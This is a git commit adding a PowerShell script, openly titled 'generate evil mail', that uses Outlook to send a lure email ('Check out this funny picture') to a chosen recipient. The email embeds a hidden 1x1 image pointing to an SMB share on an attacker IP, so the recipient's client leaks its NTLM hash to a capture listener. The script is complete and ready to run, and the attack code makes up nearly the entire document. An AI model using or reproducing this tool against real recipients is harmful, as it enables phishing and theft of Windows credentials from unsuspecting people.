9e6599216ca201726137f137c0434e457e6216e2
Oddvar Moe <oddvar.moe@gmail.com>
2016-09-28 08:31:47 +0200

    Script generate evil mail
    Script will generate a mail message that contains a 1x1 image that points to your attacker machine. If you have a SMB capture running you will get the NTLM hash.

---
+++ Security/SMBCapture-Outlook.1.1.ps1
@@ -0,0 +1,28 @@
+﻿# Author: Oddvar Moe
+# https://msitpros.com
+# version: 1.1
+
+# Script uses Outlook so you need to have an active Outlook profile on the machine the script is running on.
+
+#If multiple recipients use ; as seperator"
+$Recipient = "john.doe@contoso.com"
+$AttackerIP = "192.168.0.100"
+
+$file1="\\$AttackerIP\PictureFolder\coolPicture.png"
+$Outlook = New-Object -comObject Outlook.Application
+$newmail = $Outlook.CreateItem(0)
+$newmail.Recipients.Add($Recipient) | Out-Null
+$newmail.Subject = "Funny Pictures" 
+$newmail.HTMLBody = @"
+<html>
+<head>
+</head>
+<body>
+Hi. Check out this funny picture<br>
+<IMG WIDTH='1' HEIGHT='1' src='$file1'> </img>
+</body>
+</html>
+"@
+
+$newmail.Send()
+#$Outlook.Quit()
